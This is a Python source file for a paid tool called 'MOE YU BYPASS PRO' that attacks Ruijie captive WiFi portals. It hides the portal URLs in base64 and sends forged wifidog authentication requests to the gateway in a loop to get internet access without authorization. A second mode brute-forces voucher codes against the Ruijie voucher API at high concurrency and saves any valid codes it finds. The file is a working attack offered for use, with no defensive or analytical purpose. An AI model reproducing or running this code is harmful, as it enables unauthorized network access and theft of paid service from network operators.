import os
import re
import sys
import uuid
import time
import json
import zlib
import ntplib
import ping3
import base64
import random
import string
import urllib
import hashlib
import asyncio
import aiohttp
import requests
import argparse
import marshal
import subprocess
from datetime import datetime
from urllib.parse import quote
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"

# Colors
w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"

# Global Variables
SUCCESS = 0
IN_RUNNING_ASCII_BIN = []

def clear():
    os.system("clear")

def Line():
    print(f"{y}─" * os.get_terminal_size()[0])

def get_hwid():
    """Generating unique hardware ID for licensing"""
    id_str = f"{os.getlogin()}:{uuid.getnode()}"
    return hashlib.md5(id_str.encode()).hexdigest().upper()

def Logo():
    clear()
    logo = f"""{r}
 ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
 ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
 ▓██  ▀█▄      ▒██       ▒███     ▒██ ██░  ▒██ ██░
 ░██   █▌      ▒██    ▄  ▒▓█  ▄   ░ ▐██▓░  ░ ▐██▓░
 ░██████░      ▒ ████▀   ░▒████▒  ░ ██▒▓░  ░ ██▒▓░
 ░ ▒▓ ▒ ░      ▒ ░ ▒ ░   ░░ ▒░ ░   ██▒▒▒    ██▒▒▒ 
 ░ ░▒ ░        ░  ▒       ░ ░  ░ ▓██ ░▒░  ▓██ ░▒░ 
   ░  ░      ░          ░    ▒ ▒ ░░   ▒ ▒ ░░  
     ░       ░ ░        ░  ░ ░ ░      ░ ░      ░  
{g}
         ── {w}MOE YU BYPASS PRO {g}──{w}"""
    print(logo)
    Line()
    print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
    print(f"{g}  [🆔] {w}Your ID  : {c}{get_hwid()}")
    print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
    Line()

def check_key():
    """Key and Expiry validation from GitHub database"""
    my_id = get_hwid()
    Logo()
    print(f"{y}[*] Initializing License System...{w}")
    try:
        res = requests.get(KEY_URL, timeout=12)
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    key, exp_str = line.split("|")
                    if key.strip() == my_id:
                        today = datetime.now().date()
                        expiry = datetime.strptime(exp_str.strip(), "%Y-%m-%d").date()
                        
                        if today <= expiry:
                            days_left = (expiry - today).days
                            print(f"{g}[+] License Authorized! ({days_left} days left){w}")
                            time.sleep(1.5)
                            return True
                        else:
                            print(f"{r}[!] LICENSE EXPIRED! (Expired on: {exp_str}){w}")
                            print(f"{y}[>] Contact @moeyu to renew your subscription.")
                            sys.exit()
            
            print(f"{r}[!] UNREGISTERED DEVICE!{w}")
            print(f"{y}[>] Please register your ID: {c}{my_id}{w}")
            sys.exit()
    except:
        print(f"{r}[!] Server Connection Failed! Check your internet.")
        sys.exit()

async def get_session_id(session, session_url, prev_id):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'
    }
    try:
        async with session.get(session_url, headers=headers, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return prev_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try: self.ip = open(".ip", "r").read().strip()
        except: print(f"{r}[!] Run setup first!"); sys.exit()

    async def execute(self):
        Logo()
        print(f"{y}[*] Running Background Bypass Loop...{w}")
        async with aiohttp.ClientSession() as session:
            loop_idx = 0
            while True:
                if loop_idx % 5 == 0: sid = await get_session_id(session, self.session_url, None)
                await self.send_req(session, sid)
                await asyncio.sleep(1)
                loop_idx += 1

    async def send_req(self, session, sid):
        code = "".join(random.choice(string.digits) for _ in range(6))
        try:
            async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
                ping_val = await asyncio.to_thread(ping3.ping, 'google.com')
                ping_fmt = f"{g}{int(ping_val*1000)}ms" if ping_val else f"{r}Timeout"
                print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] {y}Bypassing... {w}| Ping: {ping_fmt} | Status: {g}{res.status}{w}")
        except: pass

class VoucherCode:
    def __init__(self, mode, length, speed):
        self.mode, self.length, self.speed = mode, length, speed
        try: self.session_url = open(".session_url", "r").read().strip()
        except: print(f"{r}[!] Run setup first!"); sys.exit()

    async def start(self):
        Logo()
        print(f"{g}[+] Bruteforce Engine Started | Mode: {self.mode}{w}")
        Line()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
            loop_idx = 0
            while True:
                if loop_idx % 90 == 0: sid = await get_session_id(session, self.session_url, None)
                v = "".join(random.choice(string.digits) if self.mode == "digit" else random.choice(string.ascii_letters) for _ in range(self.length))
                
                url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
                try:
                    async with session.post(url, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as req:
                        if 'logonUrl' in await req.text():
                            print(f"{g}[+] VOUCHER FOUND: {v}{w}")
                            with open("success.txt", "a") as f: f.write(f"{v}\n")
                except: pass
                loop_idx += 1

def feature():
    parser = argparse.ArgumentParser(description="Moe Yu Ruijie Bypass Engine")
    parser.add_argument("-o", "--option", choices=["code", "internet", "setup"], required=True)
    parser.add_argument("-m", "--mode", choices=["digit", "ascii"], default="digit")
    parser.add_argument("-l", "--length", type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=100)
    args = parser.parse_args()

    if args.option == "setup":
        Logo()
        print(f"{y}[*] Scanning Ruijie Gateways...{w}")
        try:
            res = requests.get("http://192.168.0.1", timeout=5).url
            gw = re.search('gw_address=(.*?)&', res).group(1)
            portal_text = requests.get(res).text
            sid_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", portal_text).group(1)
            with open(".session_url", "w") as f: f.write(sid_url)
            with open(".ip", "w") as f: f.write(gw)
            print(f"{g}[+] Setup Completed Successfully!{w}")
        except: print(f"{r}[!] Connection Failed. Check your WiFi connection.")
    elif args.option == "internet":
        asyncio.run(InternetAccess().execute())
    elif args.option == "code":
        asyncio.run(VoucherCode(args.mode, args.length, args.speed).start())

if __name__ == "__main__":
    if check_key():
        try: feature()
        except KeyboardInterrupt: print(f"\n{r}[!] Tool stopped by Moe Yu.{w}")
